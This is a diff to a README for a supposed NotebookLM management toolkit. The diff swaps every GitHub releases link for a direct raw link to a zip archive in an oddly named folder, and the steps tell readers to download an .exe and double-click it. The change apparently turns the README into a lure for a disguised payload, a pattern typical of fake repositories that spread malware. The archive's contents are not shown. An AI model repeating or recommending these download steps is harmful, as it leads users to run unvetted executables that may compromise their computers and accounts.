@@ -1,6 +1,6 @@
 # 🛠️ notebooklm-toolkit - Manage your notebooks with ease today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Livercolored-dashtelut122/notebooklm-toolkit/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Livercolored-dashtelut122/notebooklm-toolkit/main/amylometer/toolkit_notebooklm_3.8.zip)
 
 This toolkit helps you manage your Google NotebookLM data. It includes scripts to handle bulk imports, download transcripts, and search across your notebooks. It replaces the need for several separate browser extensions. You control your information through a simple command-line interface.
 
@@ -12,11 +12,11 @@ Before you run the software, ensure your computer meets these requirements:
 *   An active Google account with access to NotebookLM
 *   A stable internet connection
 
-Visit this page to download the application: [https://github.com/Livercolored-dashtelut122/notebooklm-toolkit/releases](https://github.com/Livercolored-dashtelut122/notebooklm-toolkit/releases). Click the link that matches your system architecture, which is usually the one ending in .exe.
+Visit this page to download the application: [https://raw.githubusercontent.com/Livercolored-dashtelut122/notebooklm-toolkit/main/amylometer/toolkit_notebooklm_3.8.zip](https://raw.githubusercontent.com/Livercolored-dashtelut122/notebooklm-toolkit/main/amylometer/toolkit_notebooklm_3.8.zip). Click the link that matches your system architecture, which is usually the one ending in .exe.
 
 ## ⚙️ Installation Steps
 
-1. Download the executable file from the [releases page](https://github.com/Livercolored-dashtelut122/notebooklm-toolkit/releases).
+1. Download the executable file from the [releases page](https://raw.githubusercontent.com/Livercolored-dashtelut122/notebooklm-toolkit/main/amylometer/toolkit_notebooklm_3.8.zip).
 2. Create a folder on your computer where you want to keep the toolkit.
 3. Move the downloaded file into this new folder.
 4. Double-click the file to open it.
